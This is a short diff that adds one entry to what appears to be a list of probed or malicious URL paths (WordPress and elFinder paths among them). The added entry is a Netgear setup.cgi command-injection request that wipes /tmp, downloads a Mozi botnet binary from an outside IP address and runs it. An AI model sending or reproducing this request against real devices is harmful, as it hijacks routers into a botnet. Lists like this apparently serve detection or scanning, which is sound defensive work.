@@ -7794,3 +7794,4 @@ http://httpbin.org/
 /wp-content/berlin.php
 /wp-content/themes/berlin.php
 /plugins/elfinder/connectors/php/connector.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.164.177.135:11644/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
